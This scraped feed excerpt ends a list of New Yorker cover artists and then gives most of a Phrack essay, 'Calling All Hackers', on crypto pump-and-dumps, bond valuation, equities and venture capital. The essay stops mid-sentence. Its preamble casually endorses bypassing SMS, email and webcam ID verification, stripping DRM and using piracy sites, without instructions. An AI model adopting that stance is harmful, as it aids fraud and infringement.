    &lt;p&gt;2024-12-16 Eric Drooker&lt;/p&gt;
    &lt;p&gt;2024-12-09 John Cuneo&lt;/p&gt;
    &lt;p&gt;2024-12-02 Tom Toro&lt;/p&gt;
    &lt;p&gt;2024-11-25 Javier Mariscal&lt;/p&gt;
    &lt;p&gt;2024-11-18 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2024-11-11 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2024-11-04 Lorenzo Mattotti&lt;/p&gt;
    &lt;p&gt;2024-10-28 Eric Drooker&lt;/p&gt;
    &lt;p&gt;2024-10-21 Owen Smith&lt;/p&gt;
    &lt;p&gt;2024-10-14 Victoria Tentler-Krylov&lt;/p&gt;
    &lt;p&gt;2024-10-07 Malika Favre&lt;/p&gt;
    &lt;p&gt;2024-09-30 Pierre-Emmanuel Lyet&lt;/p&gt;
    &lt;p&gt;2024-09-23 Christoph Niemann&lt;/p&gt;
    &lt;p&gt;2024-09-16 Mark Ulriksen&lt;/p&gt;
    &lt;p&gt;2024-09-09 R. Kikuo Johnson&lt;/p&gt;
    &lt;p&gt;2024-09-02 Pascal Campion&lt;/p&gt;
    &lt;p&gt;2024-08-26 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2024-08-19 Charles Addams&lt;/p&gt;
    &lt;p&gt;2024-08-12 Roz Chast&lt;/p&gt;
    &lt;p&gt;2024-08-05 Gayle Kabaker&lt;/p&gt;
    &lt;p&gt;2024-07-29 Paul Rogers&lt;/p&gt;
    &lt;p&gt;2024-07-22 Anita Kunz&lt;/p&gt;
    &lt;p&gt;2024-07-08&lt;/p&gt;
    &lt;p&gt;2024-07-08 Kadir Nelson&lt;/p&gt;
    &lt;p&gt;2024-07-01 Klaas Verplancke&lt;/p&gt;
    &lt;p&gt;2024-06-24 Adrian Tomine&lt;/p&gt;
    &lt;p&gt;2024-06-17 Victoria Tentler-Krylov&lt;/p&gt;
    &lt;p&gt;2024-06-10 John Cuneo&lt;/p&gt;
    &lt;p&gt;2024-06-03 Sergio Garc√≠a S√°nchez&lt;/p&gt;
    &lt;p&gt;2024-05-27 R. Kikuo Johnson&lt;/p&gt;
    &lt;p&gt;2024-05-20 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2024-05-13 Mark Ulriksen&lt;/p&gt;
    &lt;p&gt;2024-05-06 by Faith Ringgold&lt;/p&gt;
    &lt;p&gt;2024-04-22&lt;/p&gt;
    &lt;p&gt;2024-04-22 Ana Juan&lt;/p&gt;
    &lt;p&gt;2024-04-15 Peter de S√®ve&lt;/p&gt;
    &lt;p&gt;2024-04-08 Pascal Campion&lt;/p&gt;
    &lt;p&gt;2024-04-01 Mark Ulriksen&lt;/p&gt;
    &lt;p&gt;2024-03-25 Klaas Verplancke&lt;/p&gt;
    &lt;p&gt;2024-03-18 Peter de S√®ve&lt;/p&gt;
    &lt;p&gt;2024-03-11 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2024-03-04 Victoria Tentler-Krylov&lt;/p&gt;
    &lt;p&gt;2024-02-26 Marcellus Hall&lt;/p&gt;
    &lt;p&gt;2024-02-12 Nicholas Konrad&lt;/p&gt;
    &lt;p&gt;2024-02-05 Sarula Bao&lt;/p&gt;
    &lt;p&gt;2024-01-29 Roz Chast&lt;/p&gt;
    &lt;p&gt;2024-01-15 Barry Blitt&lt;/p&gt;
    &lt;p&gt;2024-01-01 Bianca Bagnarelli&lt;/p&gt;
    &lt;p&gt;2023-12-25 Edward Steed&lt;/p&gt;
    &lt;p&gt;2023-12-18 Olimpia Zagnoli&lt;/p&gt;
    &lt;p&gt;2023-12-11 Barry Blitt&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://shoplurker.com/labs/newyorker-covers/"/><published>2026-01-06T20:22:43+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=46518129</id><title>Calling All Hackers: How money works (2024)</title><updated>2026-01-07T00:55:15.685400+00:00</updated><content>&lt;doc fingerprint="332310190d2133ec"&gt;
  &lt;main&gt;
    &lt;div&gt;
      &lt;p&gt;Title : Calling All Hackers&lt;/p&gt;
      &lt;p&gt; Author : cts&lt;/p&gt;
      &lt;quote&gt; ==Phrack Inc.== Volume 0x10, Issue 0x47, Phile #0x11 of 0x11 |=-----------------------------------------------------------------------=| |=-----------------------=[ Calling All Hackers ]=-----------------------=| |=-----------------------------------------------------------------------=| |=--------------------------=[ cts (@gf_256) ]=--------------------------=| |=-----------------------------------------------------------------------=| --[ Table of Contents 0 - Preamble 1 - About the Author 2 - The Birth of a Shitcoin 3 - How Money Works 3.1 - Fixed Income 3.2 - Equities 3.3 - Shareholder Value 4 - Startup Blues 5 - Takeaways 6 - Thanks 7 - References 8 - Appendix --[ 0 - Preamble Hi. I'm cts, also known as gf_256, ephemeral, or a number of other handles. I am a hacker and now a small business owner and CEO. In this article, I would like to share my experience walking these two different paths. A hacker is someone who understands how the world works. It's about knowing what happens when you type "google.com" and press Enter. It's about knowing how your computer turns on, about memory training, A20, all of that. It's about modern processors, their caches, and their side channels. It's about DSi bootloaders and how the right electromagnetic faults can be used to jailbreak them. And it's about how Spotify and Widevine and AES and SGX work so you can free your music from the shackles of DRM. But being a hacker is so much more than these things. It's about knowing where to find things. Like libgen and Sci-Hub and nyaa. Or where to get into the latest IDA Pro group buy. Or which trackers have what and how to get into them. It's about knowing how to bypass email verification. How to bypass SMS verification. How to bypass that stupid fucking verification where you hold your driver's license up to a webcam (thank you, OBS virtual camera!) Having an actual threat model not just paranoia. Knowing that you're not worth burning a 0day on, but reading indictments to learn from others' mistakes. It's about knowing where to buy estradiol valerate on the internet and how to compound injections. Or the "bodybuilder method" to order your own blood tests when your state requires a script to do so. It's about knowing which shipments give the US CBP a bad vibe and which don't. It's about knowing what happens when you open Robinhood and giga long NVDA FDs. I mean the actual market microstructure, not "Ken Griffin PFOF bad". Then using that microstructure to find an infinite money glitch (high Sharpe!). It's about knowing how to get extra passports and reading the tax code. It's about knowing how to negotiate your salary (or equity). It's about knowing why things at the supermarket cost what they do. Or how that awful shitcoin keeps pumping. And why that dogshit startup got assigned that insane valuation. And understanding who really pays for it in the end (hint: it's you). My point is, it is not just about computers. It's about understanding how the world works. The world is made up of people. As much as machines keep society running, those machines are programmed by people--people with managers, spouses, and children; with wants, needs, and dreams. And it is about using that knowledge to bring about the change you want to see. That is what being a hacker is all about. --[ 1 - About the Author I have been a hacker for 13 years. Prior to founding Zellic, I helped start a CTF team called perfect blue (lately Blue Water). We later became the number one ranked CTF team in the world. We've played in DEF CON CTF. We've won GoogleCTF, PlaidCTF, and HITCON. It's like that scene from Mr. Robot but not cringe. In 2021, we decided to take that hacker friend circle and form a security firm. It turned out that crypto paid well, so we worked with a lot of crypto clients. In the process, we encountered insane, hilarious, and depressingly sobering bullshit. In this article, I will tell some stories about what that bullshit taught me, so you can benefit from the same lessons as I have. Markets are computers; they compute prices, valuations, and the allocation of resources in our society. Hackers are good at computers. Let's learn more about it. --[ 2 - The Birth of a Shitcoin I can't think of a better example than shitcoins. Let's look at the crypto markets in action. First, let's talk about tokens. What is their purpose? The purpose of a token is to go up. There is no other purpose. Token go up. This is important, remember this point. Now the question is, how do we make the token go up? In crypto, there are two main kinds of token deals. Let's call them the Asian Arrangement and the Western Way. The Asian Arrangement is a fairly straightforward pump and dump. It's a rectangle between the VC, the Market Maker, the Crypto Exchange, and the Token Project Founder. 1. The exchange's job is to list the token, bringing in investors. They get paid in a mix of tokens and cold, hard cash. Their superpower is owning the customer relationships with the retail users, and the naming rights to sports arenas. 2. The market maker provides liquidity so the market looks really healthy and well-traded so it is easy to buy the token. In good deals, they are paid in in-the-money call options on the tokens, so they are incentivized to help the token trade well. Their superpower is having a lot of liquidity to deploy, and people on PagerDuty. 3. The founder's job is to pump the token and shill it on Twitter. They are the hype man, and it's their job to drum up the narrative and pump everyone's bags. Their unique power is they can print more tokens out of thin air, and this is in large part how they get paid in this arrangement. 4. Lastly, the VC gets paid to organize the deal. They give the founders some money, who in return give a pinky promise that they will give the VC a lot of tokens once the tokens actually exist. This is known as a Simple Agreement for Future Tokens, or SAFT. Their superpower is dressing up the founders and project so it seems like the Next Big Thing instead of a Ponzi scheme. Everyone gets paid a ton of token exposure (directly or indirectly), and when it lists, it pumps. Then the insiders dump and leave with a fat stack. Except retail, they end up with the bag. Sometimes the listing doesn't go well for the organizers, in which case, better luck next time. But retail always loses. wtf??? LFG!!! to the moon ,o \oXo/\o/ /v | | | /\ / X\ / \ crypto investors ^ | | | | v +----------+ provides liquidity +--------+ | Crypto | &amp;lt;--------------------------------------- | Market | | Exchange | ----------------------------------------&amp;gt; | Maker | +----------+ maker fees +--------+ ^ | ^ fees, | | listing options | tokens | | / fees | | | +-------------------------------------------------+ | v | +---------+ tokens / SAFT / token warrants +---------+ | Token | ---------------------------------------&amp;gt; | Venture | | Project | &amp;lt;--------------------------------------- | Capital | +---------+ cash , intros to CEX / MM, shilling +---------+ This machine worked exceptionally well in 2017, especially before China banned crypto. All those ICO shitcoins? Asian Arrangement. And it still works well to this day, except people are more wary of lockups and vesting schedules and so on. Now let's discuss the Western Way. The Asian Arrangement? That old pump and dump? No sir, we are civilized people. Instead, our VCs *add value* to their investments by telling the world "how disruptive the tech is" and how the "team are incredible outliers". And they will not blatantly PnD the token, but instead they will fund "projects in the ecosystem" so it appears there is real activity happening on the platform. This is to hype up metrics (like TPS or TVL) to inflate the next round valuation. Anyways, then they dump. Or maybe the VC is also a market maker so they market make their portfolio company tokens. Overall it's the same shit (Ponzi) but dressed up in a nicer outfit. Asian Arrangement or Western Way--either way, if you're the token founder, your main priority is to just GO TO MARKET NOW and LAUNCH THE TOKEN. This is so you can collect your sweet bag and dump some secondary before someone else steals the narrative or the hype cycle moves on. This is one of the reasons there are so many hacks in crypto. The code is all shitty because it's rushed out as fast as possible by 20-something- year-old software engineers formerly writing Typescript and Golang at Google. Pair that with some psycho CEO product manager. Remember, it is not about WRITING SECURE CODE, it is about SHIPPING THE FUCKING PRODUCT. Good luck rewriting it in Rust! All of this worked well until Luna, then 3AC, Genesis, and FTX imploded in 2022. It still works, but you have to be less blatant now. Shitcoins do serve an essential need. They are an answer to financial nihilism. Many people are working dead-end wage slave jobs that are not enough to "make it". They feel trapped and forced to work at jobs they fucking hate and waste their life doing pointless shit to generate shareholder value. This kind of life feels unacceptable, yet there are few avenues out. So what is the only "attainable" solution left? Gamble it on shitcoins, and if you lose...maybe next paycheck will be better. But enough about crypto, let's talk about securities. --[ 3 - How Money Works ----[ 3.1 - Fixed Income First, let's start with fixed income. I'm talking boring, old-fashioned bonds, like Treasury bonds. A lot of people are introduced nowadays to finance through equities (stocks) and tokens. In my opinion, this is only half of the story. Fixed income is the bedrock of finance. It has fundamental value. It provides a prototypical asset that all assets can be benchmarked based on. Fixed income assets, like bonds, boil down to borrowing and lending. A bond is basically an IOU for someone to pay you in the future. It is more useful to have a dollar today than in a year, so lenders charge a fee for access to money today. This fee is known as interest, and how it is baked into the equation varies from asset-to-asset. Some bonds come with interest payments, whereas other bonds are zero-coupon. The most important thing is to remember that bonds are essentially an IOU to pay $X in the future. Here is an example. Let's say you would like to borrow $100 to finance an upcoming project. The interest rate will be 5% per year. To borrow money, you would issue (mint) a bond (an IOU) for $X+5 dollars to be repaid 1 year in the future. In exchange for this fresh IOU, the lender will give you $X dollars now. On the lender's balance sheet, they will be less $X dollars worth of cash, but will also have gained ($X+5) dollars worth of an asset (your IOU), creating $5 of equity. In contrast, you would have $X more cash in assets, but also an ($X+5) liability, creating -$5 of equity. This example also works for depositing money at a bank. Here, you are the lender, and the bank is the borrower. Your deposits would be liabilities on their balance sheet, as they are liable to pay you back the deposit if you choose to withdraw it. Lender's Balance Sheet Borrower's Balance Sheet =========================== =========================== Assets: Assets: IOU-----------------X+5 Cash------------------X Liabilities: Liabilities: Cash----------------(X) IOU-----------------X+5 Equity: Equity: Equity----------------5 Equity--------------(5) Fixed income assets are extremely simple. There are various risks (credit risk, interest rate risk, etc.), but excluding these factors, you essentially get what you pay for. Unlike a token or stock, the bond is not going to suddenly evaporate or crash. (In theory.) Because of this, they can be modeled in a straightforward way; a way so straightforward even a high school student can understand it. Let's say I have $X today. Suppose the prevailing (risk-free) interest rate is 5%. What is the value of this $X in a year? Obviously, it would be no less than $X*1.05, as I can just lend it out for 5% interest and get $X*1.05 back in a year. If you gave me the opportunity to invest in any asset yielding less than 5%, this would be a bad deal for me, since I could just lend it out myself to get 5% yield. Now, let's analyze the same scenario, but in reverse. Let's take that IOU from earlier. What is the value *today* of a (risk-free) $X IOU, due in 1 year? It would be worth no more than $X/1.05. This is because with $X/1.05 dollars today, I could lend it out and collect 5% interest to end up with $X again in the future. If I pay more than $X/1.05, I am getting a bad deal, since I am locking up my money with you when it would be more capital efficient to just lend it out myself. You can probably see where I am going with this. The present value of an $X IOU at some time *t* in the future is $X/(1+r)^t, where *r* is the discount rate. The discount rate describes the "decay" of the value over time, due to interest but also factors like potential failure of the asset (for example, if the asset is a company, business failure of the company). Now, if we have some asset which pays a series of future cash flows *f(t)*, we can model this asset as a bundle of IOUs with values f(t) due in time 1, 2, 3, and so on. Then the present value of this asset is the geometric series sum of the discounted future cash flows. This is called discounted cash flows (DCF). Congrats, now you can do better modeling than what goes into many early-stage venture deals. +------+-----+-----+---------+---------+---------+-------+---------+ | Year | 0 | 1 | 2 | 3 | 4 | ... | t | +------+-----+-----+---------+---------+---------+-------+---------+ | Cash | CF1 | CF2 | CF3 | CF4 | CF5 | ... | CF_t | | Flow | | | | | | | | +------+-----+-----+---------+---------+---------+-------+---------+ | Disc.| CF1 |_CF2_| __CF3__ | __CF4__ | __CF5__ | ... | _CF_t__ | | Val | | 1+r | (1+r)^2 | (1+r)^3 | (1+r)^4 | | (1+r)^t | +------+-----------+---------+---------+---------+-------+---------+ IOU 1 IOU 2 IOU 3 IOU 4 IOU 5 ... IOU n inf _ f(t) 1 DCF = \ ------- = (assume constant annual cash flow x) = --------- x /_ (1+r)^t 1-1/(1+r) t=0 = (1/r + 1) x Cash flow multiple = (value) / (annual cash flow) ~= 1/r (The astute reader might also find that they can go backwards from valuations to estimate first, second, ... Nth derivatives of the cash flow or the year-to-year survival chances of a company. And these can be compared with...going outside and touching grass to see if the valuation actually makes sense.) At this point, you're probably wondering why I'm boring you with all of this dry quant finance 101 shit. Well, it's a useful thing to know about how the world works. First, interest rates affect you directly and personally. You may have heard of the term "zero interest rate environment". In a low interest rate environment, cash flow becomes irrelevant. Why? Consider the DCF geometric series sum if the interest rate r = 0. The present value approaches infinity. If the benchmark hurdle rate we're trying to beat is 0%, literally ANYTHING is a better investment than holding onto cash. Now do you see why VCs were slamming hundreds of millions into blatantly bad deals and shit companies during Covid? Cash flow and profitability didn't matter, because you could simply borrow more money from the money printer. Here's a more concrete example. Do you remember a few years ago when Uber rides were so cheap, that they were clearly losing money on each ride? This is known as Customer Acquisition Cost, or CAC. CAC is basically the company paying you to use their app, go to their store, subscribe to the thing, ... whatever. The strategy is well-known: burn money to acquire users until everyone else dies and you become a monopoly. Then raise the prices. But here is the key point: this only works in a low-interest rate environment. In such an environment, discounting is low, and thus, future growth potential is valued over profitability and fundamentals at present. It doesn't need to make sense *today* as long as it works 10 years from now. For now, we can keep borrowing more money to sustain the burn. Of course, when rates go back up, the free money machine turns off and the effects ripple outward. You are the humble CAC farmer, farming CAC from various unprofitable consumer apps like ride share, food delivery, whatever. These apps raise their money from their investors, VC and growth equity funds. These funds in turn raise their money from *their* investors, their limited partners. These LPs might be institutional capital like pension funds, sovereign wealth funds, or family offices. At the end of the day, all of that wealth is generated somewhere throughout the economy by ordinary people. So when some VC-backed founders throw an extravagant party on a boat with fundraised dollars, in some sense, you are the one paying for it. And when the money machine turns off, anyone who had gotten complacent under ZIRP is now left scrambling. Companies will overhire during ZIRP only to do layoffs when rates go up. +=========================+ | THE LIQUIDITY CYCLE | +=========================+ VENTURE CAPITAL _______________ ,.-^=^=^=^=^=^=^=^=^=^;, ,;===============&amp;gt;&amp;gt; E^ a16z LSVP Tiger '^3. .;^ E^ FF Social Cap. '^3 // condensation .E Bain SoftBank Accel 3^ /|^ ^E KP Benchmark :^ || ^;: YC Greylock GC ;3' ,.^-^-^-^-^-^-^-^-^-^-^;, ^.=.=_=_=_=_=_=_=_=_=_=_=^ E^ endowments family '^:. \\\\\\\\\\\\\\\\\\\\ E^ offices '^3 \\\\\\\\\\\\\\\\\\\\ E' pension ^3. SOURCE \\\ precipitation \\ ^; funds sovereign 3.' CAPITAL \\\\\\\\\\\\\\\\\\\\ E;: wealth funds ,3^ (LPs) \\\\\\\\\\\\\\\\\\\\ ^;._.._._._._._._._._._._,^ \\\\\\\\\\\\\\\\\\\\ /\ ^ ^ ^ ^ ^ ^ ^ ^ gamefi /\ /\ uber eats | | | | | | | | shitcoins/::\/::\ /::::\ /\ | evaporation | / doordash/^^^^^^\ /^^\ | | | | | | | | ____________ / \ / hello \ (poggers desu) /_____ lime ____ fresh ___\ \o/ \oXo/\oXoXo/ o '==========' UNPROFITABLE CONSUMER APPS | | | | | | /|\ Oo._ /\_/\ ,/// __/_\_/_X_\/_X_X_\_/_\__ /_________(@'w'@)_____________.,://' SOCIETY \'''''''' -...-''''''''''''''''' surface THE HUMBLE runoff CAC FARMER Second, credit is not inherently a bad thing if used responsibly. Take for example those Buy Now, Pay Later loans. Now that you are equipped with the concept of capital efficiency, wouldn't it technically better than paying cash to take an interest-free BNPL loan and temporarily stick the freed cash into an investment? (Barring other side effects, etc.) Third, the concept of net present value--i.e., credit--is the killer app of finance. It allows you to transport value from the future into today. Of course, that debt must be repaid in the future, unless you can figure out a way to kick the can down the road forever. For now, let's get back to stocks. ----[ 3.2 - Equities Now we have seen both sides of the coin. Asset value is twofold: speculative and fundamental. First, we saw speculative value as illustrated by crypto meme coins. Then, on the other hand, we examined fundamental value as illustrated by, e.g. a US Treasury. These two lie on two extremes of a spectrum. Some sectors and stocks are more speculative than others; Nvidia is practically a meme coin at this point, whereas something like Coca-Cola is like fixed income for boomers (NFA BTW). Most assets have a blend of both. Thinking about stocks, they (usually) have some fundamental value. Equities represent ownership of some asset, like a business. The business in theory generates dividends for shareholders, and this cash flow (or the net present value of future ones) represents the fundamental value of the business. As we've seen, assets with better cash flows are more valuable. In practice, buybacks can be used to create what is effectively a shareholder dividend in a more tax-advantaged way. Whereas with dividends, they are taxed as income, and this is realized immediately. With buybacks, they are taxed as capital gains, but crucially the gains are not realized until the asset is sold. This could be indefinitely far in the future, so it's more capital efficient. It has the added benefit that it helps pump the token, and imo this is kind of cute because it marries both the fundamental and speculative aspects. Meanwhile, like tokens, stocks are also supposed to go up. Here's an example: imagine a generic meme coin. Apart from Go Up, what does it do? Nothing. Even if it's a Governance Token, who cares when the founders and VCs hold all the voting power? Anyways, I'm describing Airbnb Class A Common Stock. Here's an excerpt from their S-1 [1] [2]: &amp;gt; We have four series of common stock, Class A, Class B, Class C, and &amp;gt; Class H common stock (collectively, our "common stock"). The rights of &amp;gt; holders of Class A, Class B, Class C, and Class H common stock are &amp;gt; identical, except voting and conversion rights ... Each share of Class A &amp;gt; common stock is entitled to one vote, each share of Class B common stock &amp;gt; is entitled to 20 votes and is convertible at any time into one share of &amp;gt; Class A common stock ... Holders of our outstanding shares of Class B &amp;gt; common stock will beneficially own 81.7% of our outstanding capital &amp;gt; stock and represent 99.0% of the voting power of our outstanding capital &amp;gt; stock immediately following this offering, ... Name of | Class B | % | % of Vot- Beneficial Owner | Shares | | ing Power -------------------------------------+------------+-------+----------- Brian Chesky | 76,407,686 | 29.1% | 27.1% Nathan Blecharczyk | 64,646,713 | 25.3% | 23.5% Joseph Gebbia | 58,023,452 | 22.9% | 21.4% Entities Affil. w/ Sequoia Capital | 51,505,045 | 20.3% | 18.9% Why do people buy tech stocks with inflated valuations? Some may because they believe that they will go up, that they will be more dominant, important, and valuable in the future. Like tokens, a large part of stocks' value is speculative. They are expressing their opinion on the future fundamentals. Others may simply because they believe others will believe that it is more valuable. Not fundamentals, this is an opinion about *pumpamentals*. Importantly, unlike fundamental value, speculative value can be created out of thin air. It is minted by *fiat*. Fundamental value is difficult to create, whereas speculative value can be created through hype and psychology alone. ----[ 3.3 - Shareholder Value For stocks, there are usually laws in place to protect investors, pushing the balance between "speculation" and "fundamentals" towards the latter. As a result, firms are generally legally obligated to act in their shareholders' best interests. This is good because normal people will be able to participate in the wealth generated by companies. And obviously, companies should not defraud their investors. However, the biggest *stake* holders in a business, are usually (in order): 1. The employees. No matter what, no one else is spending 8 hours a day, or ~33% of their total waking lifespan at this place. Whatever it is, I guarantee you the employees feel it the most. 2. The customers. The customers are the reason the business is able to exist in the first place. Non-profits are not exempt: their customers are their donors. 3. The local community / local environment / ecosystem. The business doesn't exist in a vacuum. The business has externalities, and those externalities affect most the immediate surrounding environment. 4. And in last place, the shareholders. They do not really do anything except contribute capital and hold the stock. Of course capital is important but they are not spending 8 hours a day here, they are not the reason the business exists, and in fact they might even live in a totally different country. For large, publicly-listed companies, the shareholders have one more unique difference from the other three stakeholders: liquidity. This difference is critical. Liquidity describes how easy it is to buy and sell an asset. A dollar bill is liquid. Bitcoin is liquid. A house is relatively illiquid. Stock in large, publicly-listed companies is also liquid. A shareholder can buy a stock one day and sell it the next. As a result, the relationship is non-commital and opens the opportunity for short-term thinking. There are many things a company could do which would benefit shareholders short term, while harming the other three stakeholders long term. While a shareholder can simply dump their position and leave, the mess created is left for the employees, customers, and community to clean up. (The SPAC boom was a pretty good example of this. Not all SPACs are bad, but a lot of pretty shit businesses publicly listed through SPACs then crashed. This is sad to me because some of that is early investors and founders dumping on retail like a crypto shitcoin, but dressed up because it's NYSE or NASDAQ. Get liquidity then bail.) Now, it is a misconception that stock companies must solely paperclip- maximize short-term shareholder value. However, this is how it often plays out due to fucked up shit in the public markets, like annoying activist hedge funds or executive compensation tied to stock price. And it is true that employees can be shareholders. And that is usually a good thing! But few public companies are truly employee-owned. Thinking about it from this perspective, the concept of maximizing shareholder value seems somewhat backwards. But *why* would one make this system where the priorities are seemingly inverted? One benefit is that it would make your currency extremely valuable. Suppose you want to do some shit on Ethereum (speculating on some animal token?), you will need to have native ETH to do that transaction. Similarly, if you want to invest in US securities you at some point need US Dollars. If you want to get a piece of that sweet $NVDA action, you need dollars. People want to buy American stocks. American companies perform well: they're innovative; they're not too heavily regulated; it's a business friendly environment. (Shareholder value comes first!) The numbers go up. Remember the token founder from earlier in the Asian Arrangement? Suppose you are a *country* in the situation above, with a valuable currency. Not only is your currency in demand and valuable, you are the issuing/minting authority for that token. Similar to the token founder, you can print valuable money and pay for things with it. And speaking of being a founder, let's talk about that! --[ 4 - Startup Blues Based on what we've set up so far, I will discuss some of the problems I see with many startups today and with startup culture. Much of the problems stem from misalignment between shareholders and the other stakeholders (employees, etc). A lot of this comes from the fundamentals of venture capital. VC is itself an asset class, like fixed income and equities. VCs pitch this to their limited partners, at some level, based on the premise that their VC fund will generate yield for them. The strategy is to identify stuff that will become huge and buy it while it's still small and really cheap. Like trading shitcoins, it's about finding what's going to moon and getting in early. In a typical VC fund, a small handful of the investments will comprise the entire returns of the fund, with all of the other investments being 0's. The distribution is very power law. This means we are not looking for 1x, 2x, or 3x outcomes; these may even be seen as failure modes. We are only interested in 20x, 50x, 100x, etc. outcomes. This is because anything less will be insufficient to make up for all the bad investments that get written down to zero. For the same reason, it only makes sense for VCs to invest in certain types of companies. Have you ever heard this one? "We invest in SOFTWARE companies!...How is this SCALABLE? What do the VENTURE SCALE OUTCOMES look like here?" This is because these kinds of companies are the ones with the potential to 100x. They want you to deliver a 100x. Or how about this one? "We invest in CATEGORY-DEFINING companies". At least in security, "category-defining" means a shiny new checkbox in the compliance / cyber insurance questionnaire. In other words, a new kind of product that people MUST purchase. The market is incentivized to deliver a product that meets the minimum bar to meet that checkbox, while being useless. I invite you to think of your favorite middleware or EDR vendors here. For passionate security founders considering raising venture, remember that this is what your "success" is being benchmarked against. _.,------------------------------_ .%' '&amp;amp;. .;' We partner with founders ^; ! building category-defining ;! ; companies at the earliest stages _; ^; _.^ ''-.______________ __________.-' / / / /^ / /^ /;^ /' _________ _________ _-' '. _-' '. ,^ '^_ ,^ '^_ /' '"' /' '"' ^' ^\^ ^' ^\^ : ^| : ^| : . . |) : . . |) : \ |) : \ |) : __\ ,; : __\ ,; " ! ; " ! ; " ^\ _____ /' " ^\ _____ /' '| | ^\ _/^ '| | ^\ _/^ | ^'=====' | ^'=====' | . | | | . | | _' |^__ _' |^__ ---------_-' U '--_ -------------_-' U '--_ ----- ._ _.-' '-._ _.-' '- ':.' \ ; / ': .' \ ; / [4] It's due to the thirst for 100x that there are painful dynamics. A fledgling startup may have founders they really like, but the current business may be unscalable. Bad VCs will push founders towards strategies, bets, models that have a 1% chance of working, but pay out 200x if they do. In the process they destroy a good business--one which has earned the trust of dutiful employees and loyal customers--all for a lottery ticket to build a unicorn. They will throw 100 darts at the dartboard and maybe 5 will land, but what is it like to be the dart? You may have good expected value, but all of that EV is from spikes super far away from the origin. Is it pleasant betting everything on this distribution? VC's want founders to be cult leaders. Have you ever heard this line? "We invest in great storytellers." Like what we saw with stocks and tokens, much of the easily-unlockable potential upside in assets is speculative. In essence, value can be created through narrative. Narrative *IS* value. Bad VC's will push founders to raise more capital at ever higher valuations (higher val = markup = fees), using narrative as fuel for the fire. Storytelling means "pump the token", and the job of the CEO is to (1) be the hype man and to raise (2) cash and (3) eyeballs. For this reason, Sam Altman and Elon are fine CEOs, regardless of other factors, because they are great at all three. Much to the detriment of founders' and their employees' psyche, investors expect founders to be this legendary hype man. This requires a religiosity of belief that is borderline delusional. Have you ever tried to convince one of those Silicon Valley YC-type founder/CEOs that they are wrong? They will never listen to you because they have been socialized to be this way. It is what is expected of them, and it is easy to fall into this trap without even becoming aware of it. But if you think about it, does it make sense that to be a business owner, you need to be a religious leader? Of course not. All of these reasons are why so many startup founders are young. They have little to lose, so gambling it all is OK. Being a cult leader may be traumatizing, but they have time (and the neuroplasticity) to heal. And lastly, they do not have the life experience to have a mature personal identity beyond "I am a startup founder". All of this makes it easy to accept the external pressures to build a company this or that way. And perhaps not the way they would have wanted to, relying instead on their personal values. The true irony is that the latter is what creates true, enduring company culture and not the made-up Mad Libs-tier Company Culture Notion Page shit that so many startups have. And of course, good VCs are self-aware of all of the issues and strive to prevent them. But the overall problem remains. One last externality is for communities based around an industry. When you add billions of venture dollars into an industry, it becomes cringe. It's saddening to me seeing the state of certain cybersecurity conferences which are now dominated by..."COME TO OUR BOOTH, YOU CAN BE A HACKER. PLEASE VIEW OUR AI GENERATED GRAPHICS OF FIGURES CLAD IN DARK HOODIES STATIONED BEHIND LAPTOPS". Here I would use the pensive emoji U+1F614 to describe my feelings about the appropriation of hacker culture but Phrack is 7-bit ASCII, so please have this: :c u_u . _. --[ 5 - Takeaways The point is, all of this made me feel very small and powerless after I realized the sheer size of the problems I was staring at. Nowadays, to me it's about creating good jobs for my friends, helping our customers, and taking care of the community. Importantly, I realized that this is still making a bigger positive impact than what I could have done alone just as an individual hacker or engineer. To me, businesses are economic machines that can create positive (or negative) impact in a consistent, self-sustaining way. There are many people who are talented, kind, and thoughtful but temporarily unlucky. Having a company let me help these friends monetize their abilities and be rewarded fairly for them. And in that way I helped make their life better. Despite a lot of the BS involved in running a business, this is one thing that is very meaningful to me. You can understand computers and science and math as much as you want, but you will not be able to fix the bigger issues by yourself. The systems that run the world are much bigger than what we can break on our laptops and lab benches. But like those familiar systems, if we want to change things for the better, we have to first understand those systems. Knowledge is power. Understanding is the first step towards change. If you do not like the system as it is, then it is your duty to help fix it. Do not swallow blackpills. It's easy to get really cynical and think things are doomed (to AGI apocalypse, to environmental disaster, to techno/autocratic dystopia, whatever). I want to see a world where thoughtful hackers learn these systems and teach each other about them. That generation of hackers will wield that apparatus, NOT THE OTHER WAY AROUND. Creating leverage for yourself. Hackers should not think of themselves as "oh I am this little guy fighting Big Corporation" or whatever. This is low agency behavior. Instead become the corporation and RUN IT THE WAY YOU THINK IT SHOULD BE RUN. Keep it private and closely held, so no one can fuck it up. Closely train up successors, so in your absence it will continue to be run in a highly principled way that is aligned with your values and morals. Give employees ownership, as it makes everyone aligned with the machine's long-term success, not just you. Raising capital. Many things do really need capital, but raise in a responsible way that leaves you breathing room and the freedom to operate in ways that are aligned with your values. Never compromise your values or integrity. Stay laser focused on cash flows and sustainability, as these grant you the freedom to do the things right. HACKERS SHOULDN'T BE AFRAID TO TOUCH THE CAPITAL MARKETS. Many hackers assume "oh that fundraising stuff is for charismatic business types". I disagree. It's probably better for the world if good thoughtful hackers raise capital. Giving them leverage to change the world is better than giving that leverage to some psycho founder drinking the Kool-Aid. I deeply respect many of the authors in Phrack 71, and I would trust them to do a better job taking care of things than an amorphous amalgam of angry and greedy shareholders. For all things that don't need capital, do not raise. Stay bootstrapped for as long as possible. REMEMBER THAT VALUATION IS A VANITY METRIC. Moxie Marlinspike wrote on his blog [3] that we are often guilty of always trying to quantify success. But what is success? You can quantify net worth, but can you quantify the good you have brought to others lives? For personal goals, think long term. People tend to overestimate what they can do in 1 year, but underestimate what they can do in 10. DO NOT start a company thinking you can get your hands clean of it in 2-3 years. If you do a good job, you will be stuck with it for 5-10+ years. Therefore, DO NOT start a company until you are sure that is what you want to do with your life, or at least, your twenties/thirties (depending on when you start). A common lament among founders, even successful ones, is: "Sometimes I feel like I'm wasting my twenties". There's an easy Catch-22 here: you may not know what you really want until you do the company; but once you do the company, you won't really be able to get out of it. Be wary of that. Creating value. This is one of those meaningless phrases that I dislike. Value is what you define it to be. Remember to work on things that have TAMs, but remember that working on art is valuable too! It is not all about the TAM monster--doing cool things that are NOT ECONOMICALLY 